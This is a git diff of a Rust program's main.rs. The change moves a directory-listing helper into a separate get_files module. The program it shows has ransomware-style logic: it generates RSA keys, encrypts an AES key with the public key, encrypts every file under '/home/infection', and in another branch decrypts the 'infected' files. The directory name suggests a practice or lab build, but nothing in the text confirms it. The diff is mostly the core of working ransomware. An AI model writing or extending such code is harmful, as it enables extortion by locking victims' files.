@@ -1,28 +1,12 @@
-use std::{
-    fs::{self, File},
-    io::Write,
-    path::PathBuf,
-};
+use std::{fs::File, io::Write};
 
 use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
 
 mod decrypt;
 mod encrypt;
 mod generate_keys;
+mod get_files;
 mod parse_args;
-
-fn get_files_in_directory(path: &str) -> Vec<PathBuf> {
-    let mut files = Vec::new();
-    if let Ok(entries) = fs::read_dir(path) {
-        for entry in entries {
-            if entry.is_err() {
-                continue;
-            }
-            files.push(entry.unwrap().path());
-        }
-    }
-    files
-}
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = parse_args::parse_args();
@@ -40,12 +24,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let encrypted_aes_key = encrypt::encrypt_aes_key(&aes_key, &public_key)?;
         encryption_key_file.write_all(&encrypted_aes_key)?;
 
-        let files = get_files_in_directory("/home/infection");
+        let files = get_files::get_target_files("/home/infection");
         for file in &files {
             encrypt::encrypt_file(file, &aes_key).unwrap();
         }
     } else {
-        let encrypted_files = get_files_in_directory("/home/infection");
+        let encrypted_files = get_files::get_infected_files("/home/infection");
         let decrypted_aes_key = decrypt::decrypt_aes_key()?;
         for file in &encrypted_files {
             decrypt::decrypt_file(file, &decrypted_aes_key).unwrap();
